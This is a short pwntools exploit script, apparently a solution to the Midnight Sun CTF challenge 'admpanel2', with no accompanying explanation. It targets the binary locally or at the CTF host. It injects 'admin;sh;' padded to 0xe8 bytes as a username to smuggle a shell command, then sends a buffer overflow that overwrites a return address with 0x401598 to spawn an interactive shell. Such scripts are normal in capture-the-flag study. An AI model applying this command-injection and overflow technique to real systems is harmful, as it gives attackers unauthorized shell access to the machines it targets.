from pwn import *

e = ELF("./admpanel2")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("admpanel2-01.play.midnightsunctf.se", 31337)
else:
  p = process(e.path)

p.sendlineafter(">", "1")
p.sendlineafter(":", "admin;sh;".ljust(0xe8, "A"))
p.sendlineafter(":", "password")

p.sendlineafter(">", "2")


p.sendlineafter(":", "A" * 10 + "A" * 8 + p64(0x401598))

p.interactive()
